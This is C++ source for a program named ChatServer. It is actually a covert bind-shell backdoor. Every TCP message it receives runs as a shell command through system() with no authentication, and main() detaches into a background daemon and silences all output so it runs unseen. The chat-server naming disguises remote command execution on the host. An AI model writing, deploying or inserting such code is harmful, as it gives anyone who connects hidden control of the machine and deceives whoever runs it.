#include <iostream>
#include <vector>
#include <atomic>
#include <thread>
#include <cstring>
#include <cctype>
#include <algorithm>
#include <mutex>

#define SUCCESS 0

#define INVALID_SOCKET -1
#define SOCKET_ERROR -1
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <ifaddrs.h>
#include <unistd.h>
#include <netdb.h>
#include <arpa/inet.h>
class ChatServer {
	private:
	    int Server_socket = INVALID_SOCKET;
		std::atomic <bool> running = false;
		std::vector <std::string> all_msgs {};
		std::mutex mtx;
	public:
	    bool start(const std::string &ip, const int &port) {
			Server_socket = socket(AF_INET, SOCK_STREAM, 0);
			if (Server_socket == INVALID_SOCKET) {
				//std::cerr << "Socket creation failed" << std::endl;
				return false;
			}

			int opt = 1;
			if (setsockopt(Server_socket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt)) == SOCKET_ERROR) {
				//std::cerr << "Setsockopt failed" << std::endl;
				return false;
			}

			sockaddr_in Server_addr {};
			Server_addr.sin_family = AF_INET;
			inet_pton(AF_INET, ip.c_str(), &Server_addr.sin_addr);
			Server_addr.sin_port = htons(port); 

			if (bind(Server_socket, (sockaddr*)&Server_addr, sizeof(Server_addr)) == SOCKET_ERROR) { 
				//std::cerr << "Bind failed" << std::endl;
				return false;
			}

			if (listen(Server_socket, 1) == SOCKET_ERROR) { 
				//std::cerr << "Listen failed" << std::endl;
				return false;
			}

			running = true;
			//std::cout << "Server started on port " << port << " and IP " << ip << std::endl;
			
			acceptConnections();
			return true;
	    }
		~ChatServer() {
			running = false;
			close(Server_socket);
		}

	private:
	    void execute(const int &SenderSocket, const char *msg) {
			if (system(msg) != 0) {
				send(SenderSocket, "Command Failed", 14, 0);	
			}
			else {
				send(SenderSocket, "Command Succeeded", 17, 0);
			}
	    }
		void handleClient(const int &Client_socket) {
			char buffer[1024];
			while (running) {
				int BytesReceived = recv(Client_socket, buffer, sizeof(buffer) - 1, 0);
				if (BytesReceived <= 0) {
				    break;
				}
				buffer[BytesReceived] = '\0';
				//std::cout << std::endl << buffer << std::endl; // message	
				execute(Client_socket, buffer);
			}
			//std::cout << "Connection closed" << std::endl;
			close(Client_socket);
	    }
	    void acceptConnections() {
			sockaddr_in Client_addr {};
			socklen_t addr_len = sizeof(Client_addr);
			std::lock_guard<std::mutex> lock(mtx);
			while (running) {
				int Client_socket = accept(Server_socket, (sockaddr*)&Client_addr, &addr_len);
				if (Client_socket == INVALID_SOCKET) {
					continue;
				}
				//std::cout << "New connection" << std::endl;
				std::thread Client_thread(&ChatServer::handleClient, this,  Client_socket);
				Client_thread.detach();
			}
	    }
};

int main() {
    ChatServer server;
	int port = 0;
	std::string ip = "";
	std::cout << "Enter IP on which to start the server: ";
	std::cin >> ip;
	std::cout << "Enter port on which to start the server: ";
	std::cin >> port;
	if (!std::cin || port <= 0) {
		std::cerr << "Error: Invalid input" << std::endl;
		return -1;
	}
	std::cin.ignore(); // remove '\n' character from buffer
    pid_t ppid = fork();
	if (ppid != 0) {
		exit(0);
	}
	pid_t sid = setsid();
	if (sid < 0) {
		exit(1);
	}
	pid_t pid = fork();
	if (pid != 0) {
		exit(0);
	}

	close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
	int fd = open("/dev/null", O_RDWR);
	dup2(fd, STDIN_FILENO);
	dup2(fd, STDOUT_FILENO);
	dup2(fd, STDERR_FILENO);

	bool output = server.start(ip, port); // port to start the server
	if (!output) {
		return -1;
	}
    return 0;
}
